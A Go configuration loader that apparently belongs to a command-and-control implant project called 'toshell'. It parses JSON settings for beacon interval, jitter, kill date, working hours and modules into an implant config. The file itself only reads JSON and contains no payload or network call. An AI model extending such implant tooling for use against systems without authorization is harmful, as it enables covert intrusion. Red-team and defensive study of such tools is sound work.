package config

import (
	"encoding/json"
	"os"

	"toshell/internal/common/types"
)

type Config struct {
	ServerURL    string   `json:"server_url"`
	Protocol     string   `json:"protocol"`
	HostKey      string   `json:"host_key"`
	Interval     uint32   `json:"interval"`
	Jitter       uint32   `json:"jitter"`
	RetryCount   uint32   `json:"retry_count"`
	RetryWait    uint32   `json:"retry_wait"`
	KillDate     string   `json:"kill_date"`
	WorkingHours string   `json:"working_hours"`
	Modules      []string `json:"modules"`
}

func Load(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	return &cfg, nil
}

func LoadFromData(data []byte) (*Config, error) {
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	return &cfg, nil
}

func (c *Config) ToStruct() *types.ImplantConfig {
	return &types.ImplantConfig{
		ServerURL:    c.ServerURL,
		Protocol:     c.Protocol,
		HostKey:      c.HostKey,
		Interval:     c.Interval,
		Jitter:       c.Jitter,
		RetryCount:   c.RetryCount,
		RetryWait:    c.RetryWait,
		KillDate:     c.KillDate,
		WorkingHours: c.WorkingHours,
		Modules:      c.Modules,
	}
}

func Default() *Config {
	return &Config{
		Protocol:    "https",
		Interval:    60,
		Jitter:      10,
		RetryCount:  3,
		RetryWait:   5,
		Modules:     []string{},
	}
}
